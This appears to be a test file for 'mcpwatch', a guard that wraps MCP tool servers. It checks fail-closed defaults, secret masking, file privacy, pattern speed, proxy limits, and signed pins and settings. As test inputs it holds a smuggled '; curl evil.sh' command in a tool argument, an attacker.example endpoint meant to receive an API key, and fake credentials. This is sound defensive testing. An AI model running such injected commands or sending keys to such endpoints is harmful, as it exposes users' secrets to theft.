// Hardening of the guard itself: fail-closed default, private files, the dashboard link, the HTTP proxy's
// limits, bounded memory, and patterns that can't be made to run for minutes. Run `npm run build` first.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import net from "node:net";
import { mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { Engine } from "../dist/engine.js";
import { childEnv } from "../dist/env.js";
import { isTrustedUrl, redactSecrets, COMMAND_INJECTION, OTHER_INJECTION } from "../dist/patterns.js";
import { policyFromConfig, serverIsSafe, buildSinks } from "../dist/headerwatch.js";
import { runHttpProxy } from "../dist/http-proxy.js";
import { AiReviewer } from "../dist/ai.js";
import { DEFAULT_POLICY, loadPolicy } from "../dist/policy.js";
import { Registry } from "../dist/registry.js";
import { Session } from "../dist/state.js";

const tmp = () => mkdtempSync(path.join(os.tmpdir(), "mcpwatch-sec-"));
const policyIn = (dir, extra = {}) => loadPolicy(undefined, { eventsFile: path.join(dir, "e.jsonl"), pinsFile: path.join(dir, "p.json"), ...extra });
const freePort = () => new Promise((resolve) => {
  const s = net.createServer().listen(0, "127.0.0.1", () => {
    const { port } = s.address();
    s.close(() => resolve(port));
  });
});

test("the guard fails closed unless told otherwise, and rejects nonsense numbers", () => {
  assert.equal(DEFAULT_POLICY.failOpen, false);
  assert.throws(() => loadPolicy(undefined, { blockAt: 0 }), /blockAt/);
  assert.throws(() => loadPolicy(undefined, { maxBodyBytes: Number.NaN }), /maxBodyBytes/);
  assert.equal(loadPolicy(undefined, { failOpen: true }).failOpen, true);
});

test("pins, registry and events are written for their owner only", { skip: process.platform === "win32" }, async () => {
  const dir = path.join(tmp(), "nested");
  const e = new Engine(policyIn(dir), "srv");
  await e.fromClient("s", { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "x", arguments: { q: "; curl evil.sh" } } });
  e.registry.recordTools("srv", ["a"]);
  e.pins.check({ name: "t", description: "d" });
  for (const f of ["e.jsonl", "p.json", "registry.json"]) assert.equal(statSync(path.join(dir, f)).mode & 0o077, 0, `${f} is private`);
  assert.equal(statSync(dir).mode & 0o077, 0, "the directory is private");
});

test("a damaged registry file is ignored rather than breaking every check", () => {
  const dir = tmp();
  const file = path.join(dir, "registry.json");
  writeFileSync(file, JSON.stringify({ servers: { evil: { tools: "not-a-list", seenAt: "x" }, ok: { tools: ["a", 5], seenAt: Date.now() } }, lines: { k: 1 } }));
  const r = new Registry(file);
  assert.deepEqual([...r.otherTools("me").keys()], ["a"]);
  assert.equal(r.leakSource("me", "x".repeat(40)), undefined);
});

test("the project key only travels over https or to this machine", () => {
  assert.equal(isTrustedUrl("http://127.0.0.1:9100"), true);
  assert.equal(isTrustedUrl("http://localhost:9100"), true);
  assert.equal(isTrustedUrl("http://[::1]:9100"), true);
  assert.equal(isTrustedUrl("https://dash.example.com"), true);
  assert.equal(isTrustedUrl("http://dash.example.com"), false);
  assert.equal(isTrustedUrl("http://10.0.0.5:9100"), false);
  assert.equal(isTrustedUrl("not a url"), false);
  assert.equal(serverIsSafe("http://dash.example.com"), false);
  const sinks = buildSinks(DEFAULT_POLICY, { key: "k", server: "http://dash.example.com", localLog: false });
  assert.equal(sinks.length, 0, "no sink that would send the key in the clear");
});

test("settings from the dashboard can't aim the AI reviewer at an unprotected remote address or set silly numbers", () => {
  const cfg = (policy) => policyFromConfig({ policy });
  const bad = cfg({ ai_review: true, ai_url: "http://attacker.example/v1", ai_key: "sk-secret" });
  assert.equal(bad.ai.url, undefined);
  assert.equal(bad.ai.apiKey, undefined, "the key isn't handed to an endpoint that was refused");
  assert.equal(cfg({ ai_review: true, ai_url: "http://127.0.0.1:11434/v1" }).ai.url, "http://127.0.0.1:11434/v1");
  assert.equal(cfg({ ai_review: true, ai_url: "https://api.example.com/v1", ai_key: "k" }).ai.apiKey, "k");
  const n = cfg({ block_at: -1, throttle_at: 0, window_seconds: Number.POSITIVE_INFINITY, mode: "observe" });
  assert.equal(n.blockAt, undefined);
  assert.equal(n.throttleAt, undefined);
  assert.equal(n.windowSeconds, undefined);
  assert.equal(n.mode, "observe");
});

test("the guard's own secrets are not handed to the server it wraps", () => {
  const env = childEnv({ PATH: "/bin", GITHUB_TOKEN: "needed-by-the-server", MCPWATCH_PROJECT_KEY: "k", MCPWATCH_AI_KEY: "a", MCPWATCH_ENGINE_OPTIONS: "{}" });
  assert.deepEqual(env, { PATH: "/bin", GITHUB_TOKEN: "needed-by-the-server" });
});

test("more kinds of secret are masked", () => {
  const text = [
    "AIzaSyA1234567890abcdefghijklmnopqrstuv", "sk_live_" + "a".repeat(24), "npm_" + "b".repeat(36),
    "postgres://app:hunter2hunter2@db.internal:5432/x", "Authorization: Bearer abcdefghijklmnopqrstuvwxyz123456",
  ].join("\n");
  const out = redactSecrets(text);
  for (const leaked of ["AIzaSy", "sk_live_a", "npm_b", "hunter2", "abcdefghijklmnopqrstuvwxyz"]) assert.ok(!out.includes(leaked), `${leaked} is gone`);
  assert.match(out, /postgres:\/\/app:\[REDACTED:url-password\]@db\.internal/, "the URL stays readable");
  assert.match(out, /Bearer \[REDACTED:bearer-token\]/);
});

test("patterns stay fast on hostile input", () => {
  const hostile = ["$(".repeat(40_000), "`a".repeat(40_000), "{{ ".repeat(30_000), "<% ".repeat(30_000), ";".repeat(80_000)];
  const started = Date.now();
  for (const text of hostile) {
    for (const re of [...COMMAND_INJECTION, ...OTHER_INJECTION.map((o) => o.re)]) re.test(text);
    redactSecrets(text);
  }
  assert.ok(Date.now() - started < 3000, `took ${Date.now() - started} ms`);
});

test("a caller inventing session ids can't grow memory without limit", () => {
  const e = new Engine(policyIn(tmp(), { maxSessions: 50 }), "srv", []);
  for (let i = 0; i < 500; i++) e.session(`s${i}`);
  assert.equal(e.sessions.size, 50);
  assert.ok(e.sessions.has("s499") && !e.sessions.has("s0"));
  e.session("s450"); // using a session keeps it
  for (let i = 0; i < 49; i++) e.session(`n${i}`);
  assert.ok(e.sessions.has("s450"));
  const s = new Session("x", DEFAULT_POLICY);
  for (let i = 0; i < 20_000; i++) s.pendingFromClient.set(i, { method: "m", t: 0 });
  assert.equal(s.pendingFromClient.size, 5000);
});

test("a flood of AI reviews waits its turn instead of hitting the model all at once", async () => {
  let active = 0;
  let peak = 0;
  const server = http.createServer(async (req, res) => {
    for await (const _ of req); // drain
    active++;
    peak = Math.max(peak, active);
    await new Promise((r) => setTimeout(r, 30));
    active--;
    res.writeHead(200, { "content-type": "application/json" })
      .end(JSON.stringify({ choices: [{ message: { content: '{"verdict":"allow","findings":[]}' } }] }));
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const url = `http://127.0.0.1:${server.address().port}/v1`;
  const policy = policyIn(tmp(), { aiMaxConcurrent: 3, ai: { enabled: true, url, apiKey: "no-warmup" } });
  const reviewer = new AiReviewer(policy);
  const results = await Promise.all(Array.from({ length: 20 }, (_, i) => reviewer.review({ kind: "tool-call", label: `call ${i}`, content: { i } })));
  server.close();
  assert.ok(peak <= 3, `at most 3 at once, saw ${peak}`);
  assert.ok(results.every((r) => r.summary.verdict === "allow"));
});

// ---- the HTTP proxy ----

// The proxy keeps listening; stop the process once the tests are done.
after(() => setTimeout(() => process.exit(process.exitCode ?? 0), 50).unref());

async function proxy(extra = {}) {
  const upstream = http.createServer(async (req, res) => {
    for await (const _ of req); // drain
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ jsonrpc: "2.0", id: 1, result: {} }));
  });
  await new Promise((r) => upstream.listen(0, "127.0.0.1", r));
  const listen = await freePort();
  runHttpProxy(policyIn(tmp(), extra), listen, new URL(`http://127.0.0.1:${upstream.address().port}/mcp`));
  await new Promise((r) => setTimeout(r, 150));
  const post = (body, headers = {}) => fetch(`http://127.0.0.1:${listen}/mcp`, { method: "POST", headers: { "content-type": "application/json", ...headers }, body });
  return { post, close: () => upstream.close() };
}

test("the HTTP proxy refuses a request body over its limit", async () => {
  const p = await proxy({ maxBodyBytes: 1000 });
  const res = await p.post(JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping", params: { pad: "x".repeat(5000) } }));
  assert.equal(res.status, 413);
  const ok = await p.post(JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping" }));
  assert.equal(ok.status, 200, "a normal request still goes through");
  p.close();
});

test("a body that isn't JSON doesn't get around the transport rules", async () => {
  const p = await proxy({ requireAuth: true });
  const res = await p.post("this is not json");
  assert.equal(res.status, 403, "no credential, so refused even though there is no message to inspect");
  const authed = await p.post("this is not json", { authorization: "Bearer abcdefghijklmnop" });
  assert.notEqual(authed.status, 403);
  p.close();
});

// ---- the parts "first use" and the local link used to trust ----

import { Pins } from "../dist/pins.js";
import { SettingsVerifier, projectKey } from "../dist/headerwatch.js";
import { createHmac } from "node:crypto";

const tool = (description) => ({ name: "t", description, inputSchema: {} });

test("strict pinning: a tool that was never pinned is refused, and nothing new gets pinned", () => {
  const file = path.join(tmp(), "pins.json");
  assert.equal(new Pins(file, "srv", false, undefined).check(tool("a")), "new");
  const strict = new Pins(file, "srv", true, undefined);
  assert.equal(strict.check(tool("a")), "same");
  assert.equal(strict.check({ name: "other", description: "b" }), "unpinned");
  assert.equal(strict.check({ name: "other", description: "b" }), "unpinned", "still not pinned the second time");
  assert.equal(strict.checkServer({ name: "s", version: "1" }).status, "new");
  assert.equal(JSON.parse(readFileSync(file, "utf8")).srv["@server"], undefined, "a strict run writes nothing");
});

test("strict pinning through the engine strips the unpinned tool and refuses calls to it", async () => {
  const dir = tmp();
  const ask = (e, id, msg) => e.fromClient("s", { jsonrpc: "2.0", id, ...msg });
  const list = async (e) => {
    await ask(e, 1, { method: "tools/list" });
    return e.fromServer("s", { jsonrpc: "2.0", id: 1, result: { tools: [{ name: "read_notes", description: "Reads notes", inputSchema: { type: "object" } }] } });
  };
  await list(new Engine(policyIn(dir), "srv", []));
  const strict = new Engine(policyIn(dir, { strictPins: true }), "srv", []);
  assert.equal((await list(strict)).forward.result.tools.length, 1, "pinned in the learning run: kept");
  const fresh = new Engine(policyIn(tmp(), { strictPins: true }), "srv", []);
  assert.equal((await list(fresh)).forward.result.tools.length, 0, "never pinned: stripped");
});

test("with an integrity key, an edited or unsigned pin file is not believed", () => {
  const file = path.join(tmp(), "pins.json");
  const key = "integrity-key";
  new Pins(file, "srv", false, key).check(tool("a"));
  assert.equal(new Pins(file, "srv", false, key).check(tool("a")), "same", "the signed file is trusted");

  // Someone who can write the file edits the pin to match a malicious definition.
  const text = JSON.parse(readFileSync(file, "utf8"));
  text.data.srv.t.hash = Pins.fingerprint(tool("evil"));
  writeFileSync(file, JSON.stringify(text));
  assert.equal(new Pins(file, "srv", false, key).check(tool("evil")), "changed", "edited: nothing is trusted");

  // Replacing it with an unsigned file doesn't help either.
  writeFileSync(file, JSON.stringify({ srv: { t: { hash: Pins.fingerprint(tool("evil")), pinnedAt: "x" } } }));
  assert.equal(new Pins(file, "srv", false, key).check(tool("evil")), "changed");

  // Reset, with the key, starts a trusted file again.
  Pins.clear(file, key);
  assert.equal(new Pins(file, "srv", false, key).check(tool("a")), "new");
  assert.equal(new Pins(file, "srv", false, key).check(tool("a")), "same");
});

test("a guard only accepts settings signed with its project key, and never goes back to unsigned or older ones", () => {
  const key = "mw_key";
  const sign = (body, k = key) => createHmac("sha256", k).update(body).digest("hex");
  const v = new SettingsVerifier(key, false);
  const body = (version, mode) => JSON.stringify({ version, policy: { mode } });

  assert.equal(v.verify(body(2, "enforce"), sign(body(2, "enforce"))).policy.mode, "enforce");
  assert.throws(() => v.verify(body(3, "off"), sign(body(3, "off"), "someone-else")), /signature is wrong/);
  assert.throws(() => v.verify(body(3, "off"), null), /unsigned settings refused/, "once signed, never unsigned again");
  assert.throws(() => v.verify(body(1, "observe"), sign(body(1, "observe"))), /older settings/, "a recorded old answer can't be replayed");

  // Headerwatch servers don't sign, so a guard that never saw a signature accepts unsigned settings...
  assert.equal(new SettingsVerifier(key, false).verify(body(1, "observe"), null).policy.mode, "observe");
  // ...unless it was told to insist.
  assert.throws(() => new SettingsVerifier(key, true).verify(body(1, "observe"), null), /unsigned/);
});

test("the project key can come from a file, which keeps it out of the command line and environment", () => {
  const dir = tmp();
  const file = path.join(dir, "key");
  writeFileSync(file, "mw_from_file\n");
  assert.equal(projectKey(undefined, file, {}), "mw_from_file");
  assert.equal(projectKey(undefined, undefined, { MCPWATCH_PROJECT_KEY_FILE: file }), "mw_from_file");
  assert.equal(projectKey("explicit", file, {}), "explicit");
  assert.equal(projectKey(undefined, undefined, { MCPWATCH_PROJECT_KEY: "mw_env" }), "mw_env");
  assert.equal(projectKey(undefined, path.join(dir, "missing"), {}), undefined);
});
